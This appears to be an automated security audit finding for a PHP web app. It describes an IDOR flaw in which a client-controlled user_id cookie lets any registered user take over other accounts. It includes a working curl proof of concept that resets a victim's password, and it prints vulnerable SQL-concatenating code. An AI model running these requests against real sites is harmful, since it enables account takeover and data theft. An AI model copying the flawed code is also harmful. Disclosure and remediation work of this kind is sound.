# Vulnerability: IDOR / Authorization Bypass — client-controlled `user_id` cookie drives ownership (account takeover)

## Summary
Every authenticated user page derives the caller's identity from the client-supplied
`user_id` cookie (or a GET `user_id`), while `isAuth()` only proves that *some* user is
logged in. `user/profile.php:25,27,33` uses `cookie('user_id')` as the `WHERE id` of an
`UPDATE`/`SELECT` on `tbl_users`; `user/index.php:8-16` uses GET/cookie `user_id` to select
sites; `user/add-site.php:9,21,24` uses it for delete/insert/list. A logged-in attacker can
set `user_id` to a victim's id and overwrite the victim's email and password — a full
account takeover — as well as read/delete other tenants' data. `isAuth()` never binds the
cookie id to the session (`libs/common.php:12-14`).

## Confidence
High — found by both taint directions and survived all three adversarial attacks with a
fully cited path.

## Authentication Requirement
Authenticated (Low Privilege) — any self-registered user (open registration at
`user/register.php`).

## Attack Surface Location
- **Endpoints:** `GET/POST /user/profile.php`, `GET /user/index.php`, `GET/POST /user/add-site.php`
- **Handlers:** `user/profile.php:23-33`; `user/index.php:8-16`; `user/add-site.php:9,21,24`
- **Framework protections bypassed:** AumWAF (`libs/AumWAF.class.php:34-45`) has no signature
  for a numeric cookie; `isAuth()` (`user/profile.php:4`) is satisfied by the attacker's own
  real session, so no guard trips.

## Attack Chain
1. **Initial access:** self-register (`user/register.php`) and log in (`user/login.php`),
   obtaining a valid `PHPSESSID` and `user_id` cookie.
2. **Endpoint interaction:** request `/user/profile.php` with the attacker's session but a
   modified `user_id` cookie set to the victim's id.
3. **Malicious input:** `Cookie: PHPSESSID=<attacker>; user_id=<victim>` plus
   `POST username=victim&useremail=victim@x.com&password=owned123`.
4. **Sink execution:** `UPDATE tbl_users SET username=..., useremail=..., userpass='<new hash>' WHERE id = <victim>`
   (`user/profile.php:25`); `user/index.php:16` selects the victim's sites.
5. **Post-exploitation:** log in as the victim (`user/login.php:22`) with the attacker-set
   password.
6. **Final impact:** full account takeover; unauthorized disclosure of any user's profile
   and sites; deletion of other tenants' sites (`user/add-site.php:9`).

## Data Flow
- **Source (user input):** HTTP cookie `user_id` and GET `user_id`, fully client-controlled.
- **Sink:** SQL identity predicate `WHERE id = ' . cookie('user_id')` (`user/profile.php:25,27,33`),
  `WHERE user_id = ` (`user/index.php:16`), `DELETE ... WHERE id =` (`user/add-site.php:9`).

```
Cookie user_id → cookie('user_id') [libs/common.php:24-26]
  → UPDATE/SELECT ... WHERE id = <victim> [user/profile.php:25,27,33]
  → SELECT ... WHERE user_id = <victim> [user/index.php:16]
```

## Proof of Concept

### Prerequisites
- An attacker account (`att@x.com`); victim id known or enumerable (e.g. `1`).

### Exploit Request
```bash
T='http://{{TARGET_HOST}}'
curl -s -c /tmp/att.txt "$T/user/register.php" \
  -d 'usermail=att@x.com&username=att&p1=pw&p2=pw'
curl -s -c /tmp/att.txt -b /tmp/att.txt "$T/user/login.php" \
  -d 'email=att@x.com&password=pw'
SID=$(awk '/PHPSESSID/{print $7}' /tmp/att.txt)

# IDOR read: view victim's profile
curl -s -b "PHPSESSID=$SID; user_id=1" "$T/user/profile.php"

# Account takeover: overwrite victim's email and password
curl -s -b "PHPSESSID=$SID; user_id=1" "$T/user/profile.php" \
  -d 'username=victim&useremail=victim@x.com&password=owned123'

# Verify: log in as the victim
curl -s -i "$T/user/login.php" -d 'email=victim@x.com&password=owned123'

# Cross-tenant data read
curl -s -b "PHPSESSID=$SID" "$T/user/index.php?user_id=1"
```

### Expected Vulnerable Response
The profile page renders the victim's username/email; the UPDATE succeeds; login as
`victim@x.com` with `owned123` returns `302 index.php`; `index.php?user_id=1` lists the
victim's sites.

### Expected Patched Response
Identity is derived from the server-side session (`$_SESSION['id']`); a `user_id` differing
from the session id is ignored/rejected (`403`) and no cross-user update or read occurs.

### Impact Demonstration
Without knowing the victim's credentials, the attacker resets the victim's password and logs
in as them; iterating `user_id` discloses every user's profile and sites.

## Affected Code
```php
// user/profile.php:25,27,33
$mysqli->query("UPDATE tbl_users SET username = '" . post('username') . "', useremail='" . post('useremail') . "', userpass='" . pw(post('password')) . "' WHERE id = " . cookie('user_id'));
...
$mysqli->query("UPDATE tbl_users SET username = '" . post('username') . "', useremail='" . post('useremail') . "' WHERE id = " . cookie('user_id'));
...
$q = $mysqli->query('SELECT * FROM tbl_users WHERE id = ' . cookie('user_id'));
```
```php
// user/index.php:8-16
if( !empty( get('user_id') ) ) { $user_id = get('user_id'); }
elseif( !empty( cookie('user_id') ) ) { $user_id = cookie('user_id'); }
$query = $mysqli->query('SELECT * FROM tbl_sites WHERE user_id = ' . $user_id);
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** `cookie('user_id')` is raw (`libs/common.php:24-26`)
  and client-controlled; login merely sets it (`user/login.php:25-29`) without binding it to
  the session; only `isAuth()` (`user/profile.php:4`) guards the page, satisfiable by any
  self-registered user.
- **Impact attack — FAILED to kill.** `UPDATE tbl_users ... userpass = pw(...) WHERE id = <victim>`
  (`user/profile.php:25`) changes the victim's password — real takeover, not self-harm;
  `:33` discloses the victim's row.
- **Validity attack — FAILED to kill.** No session-to-id binding, no ownership check;
  `cookie()` is raw and the value is used as the identity predicate.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
Derive the authenticated principal exclusively from the server-side session
(`$_SESSION['id']`) and ignore all client-supplied identity values. Add
`AND user_id = <session id>` to every ownership predicate, bind parameters, and return
`403` when the requested object does not belong to the caller.
